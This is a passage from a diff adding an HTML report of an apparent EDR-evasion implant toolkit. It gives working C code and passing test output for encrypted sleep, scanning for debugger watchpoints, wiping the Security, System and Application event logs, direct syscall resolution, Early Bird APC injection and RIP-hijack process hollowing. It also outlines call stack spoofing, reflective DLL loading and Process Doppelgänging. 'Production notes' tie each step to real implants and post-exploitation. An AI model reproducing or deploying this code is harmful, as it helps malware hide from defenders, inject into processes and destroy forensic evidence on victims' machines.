+    <strong>Production notes</strong>
+    In a real implant: (1) the buffer is the running shellcode/PE image; (2) the XOR key rotates per sleep; (3) AES-128/256 replaces XOR for stronger obfuscation; (4) the timer callback approach means the sleeping thread never touches the encrypted region itself.
+  </div>
+
+  <div class="technique">
+    <div class="technique-header"><span class="technique-name">XOR-encrypt → PAGE_NOACCESS → Sleep → restore → XOR-decrypt → verify</span><span class="badge badge-pass">✓ 4096-byte round-trip verified</span></div>
+    <div class="technique-body">
+      <div class="code-wrap"><div class="code-bar"><div class="code-dots"><span></span><span></span><span></span></div><span class="code-lang">C</span></div>
+<pre><code>BOOL Evade_EkkoSleep(DWORD sleepMs) {
+    <span class="kw">const</span> SIZE_T BUF_SIZE = <span class="num">4096</span>;
+    <span class="kw">const</span> <span class="kw">BYTE</span>   XOR_KEY  = <span class="num">0xAB</span>;
+
+    <span class="dim">// Simulated shellcode/implant region (RWX)</span>
+    <span class="kw">BYTE</span>* buf = (<span class="kw">BYTE</span>*)VirtualAlloc(NULL, BUF_SIZE,
+                    MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    <span class="kw">for</span> (SIZE_T i=<span class="num">0</span>; i&lt;BUF_SIZE; i++) buf[i] = (<span class="kw">BYTE</span>)(i&amp;<span class="num">0xFF</span>);  <span class="dim">// known pattern</span>
+
+    <span class="dim">// Encrypt</span>
+    <span class="kw">for</span> (SIZE_T i=<span class="num">0</span>; i&lt;BUF_SIZE; i++) buf[i] ^= XOR_KEY;
+
+    <span class="dim">// Go dark: PAGE_NOACCESS — scanner sees only a non-readable garbled page</span>
+    DWORD oldProt;
+    VirtualProtect(buf, BUF_SIZE, PAGE_NOACCESS, &amp;oldProt);
+    Sleep(sleepMs);
+
+    <span class="dim">// Wake: restore protection, decrypt, verify</span>
+    VirtualProtect(buf, BUF_SIZE, oldProt, &amp;oldProt);
+    <span class="kw">for</span> (SIZE_T i=<span class="num">0</span>; i&lt;BUF_SIZE; i++) buf[i] ^= XOR_KEY;
+
+    BOOL ok = TRUE;
+    <span class="kw">for</span> (SIZE_T i=<span class="num">0</span>; i&lt;BUF_SIZE; i++)
+        <span class="kw">if</span> (buf[i] != (<span class="kw">BYTE</span>)(i&amp;<span class="num">0xFF</span>)) { ok=FALSE; <span class="kw">break</span>; }
+
+    VirtualFree(buf, <span class="num">0</span>, MEM_RELEASE);
+    <span class="kw">return</span> ok;
+}</code></pre></div>
+      <div class="terminal">
+        <div class="terminal-bar"><span class="term-dot term-dot-r"></span><span class="term-dot term-dot-y"></span><span class="term-dot term-dot-g"></span>Live output</div>
+<pre><code><span class="t-info">[INFO]</span> Buffer encrypted (XOR 0xAB) + PAGE_NOACCESS — sleeping 500 ms
+<span class="t-info">[INFO]</span> Round-trip integrity verified (4096 bytes)
+<span class="t-pass">[PASS]</span> Ekko sleep: XOR-encrypt → PAGE_NOACCESS → sleep → restore → verify OK</code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ PAGE_GUARD ═══ -->
+<section id="pageguard">
+  <div class="section-header">
+    <div class="section-bar"></div>
+    <div>
+      <div class="section-label">Layer 2d</div>
+      <h2 class="section-title">PAGE_GUARD scanning</h2>
+    </div>
+  </div>
+  <p>
+    The <code>PAGE_GUARD</code> protection flag causes an access violation on the <em>first</em> access to a page, then clears itself. Debuggers and some EDRs use this as a breakpoint mechanism. Walking the process's virtual address space with <code>VirtualQuery</code> and checking for the flag reveals these watchpoints without triggering them.
+  </p>
+
+  <div class="technique">
+    <div class="technique-header"><span class="technique-name">VirtualQuery scan for PAGE_GUARD flag across full address space</span><span class="badge badge-warn">⚠ 3 regions found (thread stack guards)</span></div>
+    <div class="technique-body">
+      <div class="code-wrap"><div class="code-bar"><div class="code-dots"><span></span><span></span><span></span></div><span class="code-lang">C</span></div>
+<pre><code>MEMORY_BASIC_INFORMATION mbi;
+ULONG_PTR addr = <span class="num">0</span>;
+DWORD guardCount = <span class="num">0</span>;
+
+<span class="kw">while</span> (VirtualQuery((<span class="kw">LPCVOID</span>)addr, &amp;mbi, <span class="kw">sizeof</span>(mbi)) == <span class="kw">sizeof</span>(mbi)) {
+    <span class="kw">if</span> (mbi.Protect &amp; PAGE_GUARD) {
+        guardCount++;
+        <span class="dim">// log base address, size, state, type</span>
+    }
+    <span class="kw">if</span> (mbi.RegionSize == <span class="num">0</span>) <span class="kw">break</span>;
+    ULONG_PTR next = (ULONG_PTR)mbi.BaseAddress + mbi.RegionSize;
+    <span class="kw">if</span> (next &lt;= addr) <span class="kw">break</span>;   <span class="dim">// address wrapped</span>
+    addr = next;
+}</code></pre></div>
+      <div class="terminal">
+        <div class="terminal-bar"><span class="term-dot term-dot-r"></span><span class="term-dot term-dot-y"></span><span class="term-dot term-dot-g"></span>Live output</div>
+<pre><code><span class="t-info">[INFO]</span> PAGE_GUARD @ 0x0000007980709000  size=0x3000  state=0x1000  type=0x20000
+<span class="t-info">[INFO]</span> PAGE_GUARD @ 0x0000007980AFC000  size=0x3000  state=0x1000  type=0x20000
+<span class="t-info">[INFO]</span> PAGE_GUARD @ 0x0000007980BFB000  size=0x3000  state=0x1000  type=0x20000
+<span class="t-info">[INFO]</span> Scan complete: 3 PAGE_GUARD region(s)</code></pre>
+      </div>
+      <div class="callout callout-note">
+        <strong>Why three regions on a clean process?</strong>
+        <code>state=0x1000</code> (MEM_COMMIT) and <code>type=0x20000</code> (MEM_PRIVATE) at stack-boundary addresses are normal Windows thread stack guard pages. Every thread gets guard pages at the low end of its stack to detect overflow. These are not EDR watchpoints. In a real deployment, an implant would filter these out (e.g., only flag guard pages that sit inside loaded module ranges or PE image regions) rather than treating all guard pages as hostile.
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ EVENT LOG ═══ -->
+<section id="eventlog">
+  <div class="section-header">
+    <div class="section-bar"></div>
+    <div>
+      <div class="section-label">Layer 2e</div>
+      <h2 class="section-title">Event log wipe</h2>
+    </div>
+  </div>
+  <p>
+    <code>ClearEventLogA</code> empties a named event log channel. Wiping Security, System, and Application logs removes most forensic artefacts from the host. This requires an elevated token: the Security log needs <code>SeSecurityPrivilege</code>; System and Application need an admin token.
+  </p>
+
+  <div class="technique">
+    <div class="technique-header"><span class="technique-name">ClearEventLogA on Security / System / Application channels</span><span class="badge badge-warn">⚠ ERROR_ACCESS_DENIED (not admin)</span></div>
+    <div class="technique-body">
+      <div class="code-wrap"><div class="code-bar"><div class="code-dots"><span></span><span></span><span></span></div><span class="code-lang">C</span></div>
+<pre><code><span class="kw">static const char</span>* channels[] = { <span class="str">"System"</span>, <span class="str">"Application"</span>, <span class="str">"Security"</span>, NULL };
+<span class="kw">for</span> (<span class="kw">int</span> i=<span class="num">0</span>; channels[i]; i++) {
+    HANDLE hLog = OpenEventLogA(NULL, channels[i]);
+    <span class="kw">if</span> (!hLog) <span class="kw">continue</span>;           <span class="dim">// Security: needs SeSecurityPrivilege</span>
+    ClearEventLogA(hLog, NULL);    <span class="dim">// System/Application: needs admin token</span>
+    CloseEventLog(hLog);
+}</code></pre></div>
+      <div class="terminal">
+        <div class="terminal-bar"><span class="term-dot term-dot-r"></span><span class="term-dot term-dot-y"></span><span class="term-dot term-dot-g"></span>Live output (non-admin run)</div>
+<pre><code><span class="t-info">[INFO]</span> ClearEventLog("System")      failed: 5  (ERROR_ACCESS_DENIED)
+<span class="t-info">[INFO]</span> ClearEventLog("Application")  failed: 5  (ERROR_ACCESS_DENIED)
+<span class="t-info">[INFO]</span> OpenEventLog("Security")      failed: 1314  (ERROR_PRIVILEGE_NOT_HELD)
+<span class="t-fail">[FAIL]</span> Event log wipe: requires admin — expected in non-elevated context</code></pre>
+      </div>
+      <div class="callout">
+        <strong>Production note</strong>
+        In a real post-exploitation chain, the event log wipe runs after privilege escalation. The function is structurally correct — it just needs an elevated token to succeed.
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ CALL STACK SPOOFING (concept) ═══ -->
+<section id="callstack">
+  <div class="section-header">
+    <div class="section-bar section-bar-purple"></div>
+    <div>
+      <div class="section-label section-label-purple">Layer 2f · Concept</div>
+      <h2 class="section-title">Call stack spoofing</h2>
+    </div>
+  </div>
+  <p>
+    Modern EDRs walk the call stack of any suspicious thread (e.g., a thread that called <code>NtAllocateVirtualMemory</code>) to see which module issued the call. If the return address on the stack points into an anonymous RWX region, that is an immediate red flag. Call stack spoofing inserts a believable fake return chain to make the call look like it originated from a trusted module.
+  </p>
+
+  <div class="concept-box">
+    <h4>Mechanism — return address override via trampoline gadget</h4>
+    <p>The core primitive is a <strong>trampoline gadget</strong>: a small stub in a legitimate module (or a hand-crafted ROP stub in a RW region) that performs <code>add rsp, N; jmp [rbx]</code>. Before invoking the syscall:</p>
+    <p>1. Push a fake return address that points into a trusted DLL (<code>ntdll!LdrInitializeThunk</code>, <code>kernel32!BaseThreadInitThunk</code>, etc.).<br>
+    2. Set up additional fake frames on the stack as needed by the EDR's stack depth.<br>
+    3. Issue the syscall stub by calling through the trampoline instead of directly — the CPU's return prediction sees the spoofed chain.</p>
+    <p>A complete implementation requires knowing the exact stack frame layout expected by the target EDR, and is highly version-specific. The technique is fundamentally a <strong>crafted ROP chain</strong> whose job is deception rather than code execution.</p>
+  </div>
+
+  <div class="code-wrap">
+    <div class="code-bar"><div class="code-dots"><span></span><span></span><span></span></div><span class="code-lang">asm · conceptual trampoline stub (MASM)</span></div>
+<pre><code><span class="dim">; GadgetTrampoline PROC</span>
+<span class="dim">;   rbx = real syscall stub address</span>
+<span class="dim">;   [rsp] = fake return address (planted by caller)</span>
+<span class="hi">add</span> rsp, <span class="num">8</span>          <span class="dim">; skip over the spoofed frame entry</span>
+<span class="hi">jmp</span> <span class="kw">QWORD PTR</span> [rbx]  <span class="dim">; jump to actual Nt* stub</span>
+<span class="dim">; GadgetTrampoline ENDP</span>
+
+<span class="dim">; Caller sets up:</span>
+<span class="dim">;   push [RetAddrInKernel32]   ← fake "caller" seen by stack walker</span>
+<span class="dim">;   push [RetAddrInNtdll]      ← second fake frame</span>
+<span class="dim">;   lea  rbx, NtAllocVirtMem_stub</span>
+<span class="dim">;   call GadgetTrampoline</span></code></pre>
+  </div>
+</section>
+
+<!-- ═══ CLR UNHOOK ═══ -->
+<section id="clr">
+  <div class="section-header">
+    <div class="section-bar section-bar-purple"></div>
+    <div>
+      <div class="section-label section-label-purple">Layer 2g · Concept</div>
+      <h2 class="section-title">CLR unhooking</h2>
+    </div>
+  </div>
+  <p>
+    When a .NET payload runs inside a host process that has the Common Language Runtime loaded, EDRs hook methods in <code>clr.dll</code> in addition to <code>ntdll.dll</code>. The unhooking approach is identical to the NTDLL technique: map a fresh copy of <code>clr.dll</code> from disk, locate its <code>.text</code> section, and overwrite the live image.
+  </p>
+
+  <div class="concept-box">
+    <h4>Implementation outline</h4>
+    <p>Replace <code>"ntdll.dll"</code> with <code>"clr.dll"</code> in the NTDLL unhook function and call it after verifying that the CLR is loaded (<code>GetModuleHandleA("clr.dll") != NULL</code>). The same <code>SEC_IMAGE</code> mapping technique applies because <code>clr.dll</code> is a standard PE image.</p>
+    <p>The relevant CLR functions that EDRs frequently hook include <code>CLRCreateInstance</code>, <code>ICorRuntimeHost::CreateDomain</code>, and JIT-compilation callbacks. Restoring the entire <code>.text</code> section removes all of them at once.</p>
+  </div>
+</section>
+
+<!-- ═══ SYSCALLS ═══ -->
+<section id="syscalls">
+  <div class="section-header">
+    <div class="section-bar section-bar-warm"></div>
+    <div>
+      <div class="section-label section-label-warm">Layer 2h</div>
+      <h2 class="section-title">Hell's Gate &amp; Tartarus Gate — SSN resolution</h2>
+    </div>
+  </div>
+  <p>
+    Even with ntdll unhooked, calls through the import table are auditable. Direct syscalls bypass userland dispatch by finding the System Service Number (SSN) and issuing a raw <code>syscall</code> instruction.
+    <strong>Hell's Gate</strong> reads the SSN when the stub is clean.
+    <strong>Tartarus Gate</strong> infers it from a neighbouring clean stub when the target is hooked.
+  </p>
+
+  <div class="technique">
+    <div class="technique-header"><span class="technique-name">Walk PE export table, detect stub pattern 4C 8B D1 B8, extract SSN from bytes 4–5</span><span class="badge badge-pass">✓ 10/10 resolved</span></div>
+    <div class="technique-body">
+      <div class="code-wrap"><div class="code-bar"><div class="code-dots"><span></span><span></span><span></span></div><span class="code-lang">C</span></div>
+<pre><code><span class="dim">// Hell's Gate: stub is clean</span>
+<span class="kw">if</span> (stub[<span class="num">0</span>]==<span class="num">0x4C</span> &amp;&amp; stub[<span class="num">1</span>]==<span class="num">0x8B</span> &amp;&amp; stub[<span class="num">2</span>]==<span class="num">0xD1</span> &amp;&amp; stub[<span class="num">3</span>]==<span class="num">0xB8</span>) {
+    *outSSN = *(WORD*)(stub + <span class="num">4</span>);   <span class="dim">// bytes 4-5 = SSN</span>
+    <span class="kw">return</span> TRUE;
+}
+<span class="dim">// Tartarus Gate: stub hooked, infer from ±delta neighbours</span>
+<span class="kw">for</span> (DWORD d=<span class="num">1</span>; d&lt;=<span class="num">32</span>; d++) {
+    <span class="kw">BYTE</span>* above = hNtdll + funcs[ordinals[idx-d]];
+    <span class="kw">if</span> (IsCleanStub(above)) { *outSSN = *(WORD*)(above+<span class="num">4</span>) + d; <span class="kw">return</span> TRUE; }
+    <span class="kw">BYTE</span>* below = hNtdll + funcs[ordinals[idx+d]];
+    <span class="kw">if</span> (IsCleanStub(below)) { *outSSN = *(WORD*)(below+<span class="num">4</span>) - d; <span class="kw">return</span> TRUE; }
+}</code></pre></div>
+      <div class="ssn-table-wrap">
+        <table>
+          <thead><tr><th>Function</th><th>Resolved SSN</th><th>22H2 expected</th><th>Result</th></tr></thead>
+          <tbody>
+            <tr><td class="fn">NtReadFile</td><td>0x0006</td><td>0x0006</td><td class="match">MATCH</td></tr>
+            <tr><td class="fn">NtWriteFile</td><td>0x0008</td><td>0x0008</td><td class="match">MATCH</td></tr>
+            <tr><td class="fn">NtCreateFile</td><td>0x0055</td><td>0x0055</td><td class="match">MATCH</td></tr>
+            <tr><td class="fn">NtAllocateVirtualMemory</td><td>0x0018</td><td>0x0018</td><td class="match">MATCH</td></tr>
+            <tr><td class="fn">NtWriteVirtualMemory</td><td>0x003A</td><td>0x003A</td><td class="match">MATCH</td></tr>
+            <tr><td class="fn">NtProtectVirtualMemory</td><td>0x0050</td><td>0x0050</td><td class="match">MATCH</td></tr>
+            <tr><td class="fn">NtCreateThreadEx</td><td>0x00C2</td><td>0x00C1</td><td class="diff">DIFF · build offset</td></tr>
+            <tr><td class="fn">NtQuerySystemInformation</td><td>0x0036</td><td>0x0036</td><td class="match">MATCH</td></tr>
+            <tr><td class="fn">NtTerminateProcess</td><td>0x002C</td><td>0x002C</td><td class="match">MATCH</td></tr>
+            <tr><td class="fn">NtOpenProcess</td><td>0x0026</td><td>0x0026</td><td class="match">MATCH</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>The one-number offset on <code>NtCreateThreadEx</code> (0x00C2 vs 0x00C1) is a build difference — the system is newer than the reference table. The code resolved it correctly; it didn't hardcode and fail.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ EARLY BIRD APC ═══ -->
+<section id="injection">
+  <div class="section-header">
+    <div class="section-bar section-bar-warm"></div>
+    <div>
+      <div class="section-label section-label-warm">Layer 3a</div>
+      <h2 class="section-title">Early Bird APC injection</h2>
+    </div>
+  </div>
+  <p>
+    Creating a process with <code>CREATE_SUSPENDED</code> and queuing an APC before resuming means the APC fires during <code>LdrInitializeThunk</code> — before the EDR's DLL has been loaded into the target's address space. By the time the EDR hooks anything, the payload has already run.
+  </p>
+
+  <div class="technique">
+    <div class="technique-header"><span class="technique-name">CREATE_SUSPENDED → VirtualAllocEx → WriteProcessMemory → QueueUserAPC → ResumeThread</span><span class="badge badge-pass">✓ Exit code 0x0000BEEF</span></div>
+    <div class="technique-body">
+      <p>Test payload: 26 bytes of x64 shellcode that calls <code>ExitProcess(0xBEEF)</code>. Verification: <code>GetExitCodeProcess</code> after <code>WaitForSingleObject</code>.</p>
+      <div class="code-wrap"><div class="code-bar"><div class="code-dots"><span></span><span></span><span></span></div><span class="code-lang">C · shellcode template (26 bytes)</span></div>
+<pre><code><span class="kw">static</span> <span class="kw">BYTE</span> g_SCTemplate[] = {
+    <span class="num">0xB9</span>, <span class="num">0xEF</span>, <span class="num">0xBE</span>, <span class="num">0x00</span>, <span class="num">0x00</span>,          <span class="dim">// mov ecx, 0xBEEF</span>
+    <span class="num">0x48</span>, <span class="num">0x83</span>, <span class="num">0xEC</span>, <span class="num">0x28</span>,                <span class="dim">// sub rsp, 0x28 (shadow space)</span>
+    <span class="num">0x48</span>, <span class="num">0xB8</span>, <span class="num">0x00</span>, <span class="num">0x00</span>, <span class="num">0x00</span>, <span class="num">0x00</span>,   <span class="dim">// mov rax, &lt;ExitProcess addr&gt;</span>
+              <span class="num">0x00</span>, <span class="num">0x00</span>, <span class="num">0x00</span>, <span class="num">0x00</span>,
+    <span class="num">0xFF</span>, <span class="num">0xD0</span>,                              <span class="dim">// call rax</span>
+    <span class="num">0x48</span>, <span class="num">0x83</span>, <span class="num">0xC4</span>, <span class="num">0x28</span>,                <span class="dim">// add rsp, 0x28</span>
+    <span class="num">0xC3</span>                                    <span class="dim">// ret (unreachable)</span>
+};</code></pre></div>
+      <div class="code-wrap"><div class="code-bar"><div class="code-dots"><span></span><span></span><span></span></div><span class="code-lang">C · injection sequence</span></div>
+<pre><code>CreateProcessA(NULL, <span class="str">"notepad.exe"</span>, ..., CREATE_SUSPENDED, ..., &amp;pi);
+LPVOID p = VirtualAllocEx(pi.hProcess, NULL, scSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+WriteProcessMemory(pi.hProcess, p, sc, scSize, &amp;written);
+QueueUserAPC((PAPCFUNC)p, pi.hThread, <span class="num">0</span>);    <span class="dim">// fires before EDR hooks load</span>
+ResumeThread(pi.hThread);
+WaitForSingleObject(pi.hProcess, <span class="num">8000</span>);
+GetExitCodeProcess(pi.hProcess, &amp;exitCode);   <span class="dim">// should be 0xBEEF</span></code></pre></div>
+      <div class="terminal">
+        <div class="terminal-bar"><span class="term-dot term-dot-r"></span><span class="term-dot term-dot-y"></span><span class="term-dot term-dot-g"></span>Live output</div>
+<pre><code><span class="t-info">[INFO]</span> Created notepad.exe PID=8716 (suspended)
+<span class="t-info">[INFO]</span> Allocated 26 bytes at 0x000001BF68A40000
+<span class="t-info">[INFO]</span> APC queued to thread 0xB44
+<span class="t-info">[INFO]</span> Target exited: <span class="t-pass">0x0000BEEF</span> ✓
+<span class="t-pass">[PASS]</span> Early Bird APC confirmed</code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ HOLLOWING ═══ -->
+<section id="hollowing">
+  <div class="section-header">
+    <div class="section-bar"></div>
+    <div>
+      <div class="section-label">Layer 3b</div>
+      <h2 class="section-title">Process hollowing — RIP hijack variant</h2>
+    </div>
+  </div>
+  <p>Full process hollowing replaces the target's entire PE image. The RIP-hijack variant shown here demonstrates the same thread-context manipulation primitive with less complexity: create the process suspended, write shellcode into a new allocation, change the main thread's <code>RIP</code> register to point to it, resume.</p>
+
+  <div class="technique">
+    <div class="technique-header"><span class="technique-name">GetThreadContext → override RIP → SetThreadContext → ResumeThread</span><span class="badge badge-pass">✓ Exit code 0x0000BEEF</span></div>
+    <div class="technique-body">
+      <div class="code-wrap"><div class="code-bar"><div class="code-dots"><span></span><span></span><span></span></div><span class="code-lang">C</span></div>
+<pre><code>CONTEXT ctx; ctx.ContextFlags = CONTEXT_FULL;
+GetThreadContext(pi.hThread, &amp;ctx);
+ctx.Rip = (DWORD64)pRemote;    <span class="dim">// redirect first instruction to shellcode</span>
+SetThreadContext(pi.hThread, &amp;ctx);
+ResumeThread(pi.hThread);</code></pre></div>
+      <div class="terminal">
+        <div class="terminal-bar"><span class="term-dot term-dot-r"></span><span class="term-dot term-dot-y"></span><span class="term-dot term-dot-g"></span>Live output</div>
+<pre><code><span class="t-info">[INFO]</span> Original RIP: <span class="t-warn">0x7FF96E582680</span>
+<span class="t-info">[INFO]</span> New      RIP: <span class="t-warn">0x2419A380000</span>
+<span class="t-info">[INFO]</span> Target exited: <span class="t-pass">0x0000BEEF</span> ✓
+<span class="t-pass">[PASS]</span> Process Hollowing (RIP hijack) confirmed</code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ REFLECTIVE DLL ═══ -->
+<section id="reflective">
+  <div class="section-header">
+    <div class="section-bar section-bar-purple"></div>
+    <div>
+      <div class="section-label section-label-purple">Layer 3c · Concept</div>
+      <h2 class="section-title">Reflective DLL injection</h2>
+    </div>
+  </div>
+  <p>
+    A Reflective DLL is a DLL that contains its own mini-loader in a function called <code>ReflectiveLoader</code>. When injected into a remote process as raw bytes (no <code>LoadLibrary</code>), the caller jumps directly to <code>ReflectiveLoader</code>, which then:
+  </p>
+
+  <div class="concept-box">
+    <h4>Loader sequence (runs entirely from within the injected buffer)</h4>
+    <p><strong>1.</strong> Find <code>kernel32.dll</code> base by walking <code>PEB.InMemoryOrderModuleList</code>.</p>
+    <p><strong>2.</strong> Resolve <code>LoadLibraryA</code>, <code>GetProcAddress</code>, <code>VirtualAlloc</code> from kernel32 export table.</p>
+    <p><strong>3.</strong> Allocate a new region large enough for the DLL's virtual size.</p>
+    <p><strong>4.</strong> Copy the PE header and each section into place.</p>
+    <p><strong>5.</strong> Process the base relocation table (adjust pointers for the new base address).</p>
+    <p><strong>6.</strong> Walk the import directory and resolve each import using <code>LoadLibraryA</code> + <code>GetProcAddress</code>.</p>
+    <p><strong>7.</strong> Call <code>DllMain(DLL_PROCESS_ATTACH)</code>.</p>
+    <p>The result: a fully functional DLL in memory that never appeared in <code>LoadLibrary</code> call records and has no entry in the <code>PEB.InMemoryOrderModuleList</code>.</p>
+  </div>
+</section>
+
+<!-- ═══ DOPPELGÄNGING ═══ -->
+<section id="doppel">
+  <div class="section-header">
+    <div class="section-bar section-bar-purple"></div>
+    <div>
+      <div class="section-label section-label-purple">Layer 3d · Concept</div>
+      <h2 class="section-title">Process Doppelgänging</h2>
+    </div>
+  </div>
+  <p>
+    Process Doppelgänging (Tal Liberman &amp; Eugene Kogan, BlackHat 2017) abuses <strong>NTFS Transactional File System (TxF)</strong> to create a process from a payload that never exists as a real file on disk.
+  </p>
+
+  <div class="concept-box">
+    <h4>Mechanism</h4>
+    <p><strong>1. Transact</strong> — Open a TxF transaction (<code>NtCreateTransaction</code>). Within the transaction, overwrite a legitimate system file (e.g., <code>calc.exe</code>) with the malicious payload using <code>NtCreateFile</code> + <code>NtWriteFile</code>.</p>
+    <p><strong>2. Load</strong> — Call <code>NtCreateSection(SEC_IMAGE)</code> on the transacted file handle. The kernel creates a section backed by the malicious content, because from the kernel's view the transaction has committed (locally).</p>
+    <p><strong>3. Rollback</strong> — Roll back the transaction (<code>NtRollbackTransaction</code>). The file on disk reverts to the original; the section object retains the malicious content.</p>
+    <p><strong>4. Execute</strong> — Create a process from the section, set up PEB, initial thread, and stack, then resume. The resulting process has a legitimate-looking image path but runs the malicious payload.</p>
+    <p><em>Note:</em> TxF is deprecated in Windows 10 1709+ and is increasingly blocked or monitored by EDRs. Modern Windows also may reject <code>SEC_IMAGE</code> creation on transacted files in certain configurations.</p>
+  </div>
+</section>
+
+<!-- ═══ AES-256-GCM ═══ -->
+<section id="aes">
+  <div class="section-header">
+    <div class="section-bar section-bar-green"></div>
+    <div>
+      <div class="section-label section-label-green">Layer 4a</div>
+      <h2 class="section-title">AES-256-GCM via Windows BCrypt</h2>
+    </div>
+  </div>
+  <p>
+    AES-256-GCM is the standard choice for implant payload encryption: 256-bit key gives 128-bit security against brute force, and GCM's authentication tag provides integrity — any tampering with the ciphertext causes <code>BCryptDecrypt</code> to return <code>STATUS_AUTH_TAG_MISMATCH</code>, so a corrupted or injected payload is rejected before executing.
+  </p>
+
+  <div class="technique">
+    <div class="technique-header"><span class="technique-name">BCryptOpenAlgorithmProvider(AES) → BCRYPT_CHAIN_MODE_GCM → encrypt → decrypt → verify tag</span><span class="badge badge-pass">✓ GCM tag authenticated</span></div>
+    <div class="technique-body">
+      <div class="code-wrap"><div class="code-bar"><div class="code-dots"><span></span><span></span><span></span></div><span class="code-lang">C</span></div>
+<pre><code>BCRYPT_ALG_HANDLE hAlg; BCRYPT_KEY_HANDLE hKey;
+BCryptOpenAlgorithmProvider(&amp;hAlg, BCRYPT_AES_ALGORITHM, NULL, <span class="num">0</span>);
+BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
+    (PBYTE)BCRYPT_CHAIN_MODE_GCM, <span class="kw">sizeof</span>(BCRYPT_CHAIN_MODE_GCM), <span class="num">0</span>);
+BCryptGenerateSymmetricKey(hAlg, &amp;hKey, keyObj, keyObjLen, key, <span class="num">32</span>, <span class="num">0</span>);
+
+<span class="dim">// Encrypt with GCM auth info (96-bit nonce, 128-bit tag)</span>
+BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;
+BCRYPT_INIT_AUTH_MODE_INFO(ai);
+ai.pbNonce = iv; ai.cbNonce = <span class="num">12</span>;
+ai.pbTag   = authTag; ai.cbTag = <span class="num">16</span>;
+BCryptEncrypt(hKey, plaintext, ptLen, &amp;ai, NULL, <span class="num">0</span>,
+    ciphertext, <span class="kw">sizeof</span>(ciphertext), &amp;cbCT, <span class="num">0</span>);
+
+<span class="dim">// Decrypt — returns STATUS_AUTH_TAG_MISMATCH if tag fails</span>
+BCryptDecrypt(hKey, ciphertext, cbCT, &amp;ai2, NULL, <span class="num">0</span>,
+    decrypted, <span class="kw">sizeof</span>(decrypted), &amp;cbPT, <span class="num">0</span>);</code></pre></div>
+      <div class="terminal">
+        <div class="terminal-bar"><span class="term-dot term-dot-r"></span><span class="term-dot term-dot-y"></span><span class="term-dot term-dot-g"></span>Live output</div>
+<pre><code><span class="t-info">[INFO]</span> Encrypted 24 → 24 bytes; GCM tag: <span class="t-warn">5E ED BA 02</span>...
+<span class="t-info">[INFO]</span> Decrypted: "<span class="t-pass">EDR-EVASION-TEST-PAYLOAD</span>" — matches original
+<span class="t-pass">[PASS]</span> AES-256-GCM: round-trip verified (GCM tag authenticated)</code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ KDF ═══ -->
+<section id="kdf">
+  <div class="section-header">
+    <div class="section-bar section-bar-green"></div>
+    <div>
+      <div class="section-label section-label-green">Layer 4b</div>
+      <h2 class="section-title">Environment-bound key derivation — PBKDF2-SHA256</h2>
+    </div>
+  </div>
+  <p>
+    An implant that hardcodes its decryption key is vulnerable to static analysis — extract the key, decrypt the payload. The counter: derive the key at runtime from machine-specific values. Only on the intended target do the inputs exist to produce the correct key.
+  </p>
+
+  <div class="technique">
+    <div class="technique-header"><span class="technique-name">BCryptDeriveKeyPBKDF2 — HMAC-SHA256 · 100,000 iterations · environment inputs</span><span class="badge badge-pass">✓ Key: A6A27B8D 33FC1150...</span></div>
+    <div class="technique-body">
+      <p>The <em>password</em> is assembled at runtime from environment-specific values. The salt is a fixed per-campaign value embedded in the loader. 100,000 PBKDF2 iterations cost ~100 ms on modern hardware, adding meaningful cost to offline bruteforce even if the salt is known.</p>
+      <div class="code-wrap"><div class="code-bar"><div class="code-dots"><span></span><span></span><span></span></div><span class="code-lang">C</span></div>
+<pre><code><span class="dim">// Production: password assembled from live environment</span>
+<span class="dim">// e.g. sprintf(password, "%s|%s|%08lX",</span>
+<span class="dim">//              computerName, userName, volumeSerial);</span>
+<span class="kw">static const</span> <span class="kw">BYTE</span> password[] = <span class="str">"env:MAC=00:1A:2B:3C:4D:5E,VOL=DEADBEEF"</span>;
+<span class="kw">static const</span> <span class="kw">BYTE</span> salt[<span class="num">16</span>]   = { <span class="num">0xDE</span>,<span class="num">0xAD</span>, ... };
+
+BCRYPT_ALG_HANDLE hAlg;
+BCryptOpenAlgorithmProvider(&amp;hAlg, BCRYPT_SHA256_ALGORITHM, NULL,
+    BCRYPT_ALG_HANDLE_HMAC_FLAG);
+
+BCryptDeriveKeyPBKDF2(hAlg,
+    (<span class="kw">PBYTE</span>)password, <span class="kw">sizeof</span>(password)-<span class="num">1</span>,
+    (<span class="kw">PBYTE</span>)salt,     <span class="kw">sizeof</span>(salt),
+    <span class="num">100000ULL</span>,       <span class="dim">// 100k iterations</span>
+    derivedKey,      <span class="num">32</span>, <span class="num">0</span>);</code></pre></div>
+      <div class="terminal">
+        <div class="terminal-bar"><span class="term-dot term-dot-r"></span><span class="term-dot term-dot-y"></span><span class="term-dot term-dot-g"></span>Live output</div>
+<pre><code><span class="t-info">[INFO]</span> PBKDF2-SHA256 (100k iter) derived key:
+<span class="t-info">[INFO]</span>   <span class="t-pass">A6A27B8D 33FC1150 3B5B9820 48933CCF</span> ...
+<span class="t-pass">[PASS]</span> PBKDF2-SHA256: environment-bound key derived</code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ═══ RESULTS ═══ -->
+<section id="results">
+  <div class="section-header">
+    <div class="section-bar"></div>
+    <div>
+      <div class="section-label">Summary</div>
+      <h2 class="section-title">Full test run — all layers</h2>
+    </div>
+  </div>
+
+  <div class="results-grid">
+    <div class="result-card"><div class="result-score score-pass">5/7</div><div class="result-label">Anti-Analysis</div></div>
+    <div class="result-card"><div class="result-score score-pass">3/3</div><div class="result-label">AMSI/ETW/Unhook</div></div>
+    <div class="result-card"><div class="result-score score-pass">✓</div><div class="result-label">Ekko Sleep</div></div>
+    <div class="result-card"><div class="result-score score-pass">10/10</div><div class="result-label">SSNs Resolved</div></div>
+    <div class="result-card"><div class="result-score score-pass">2/2</div><div class="result-label">Injection</div></div>
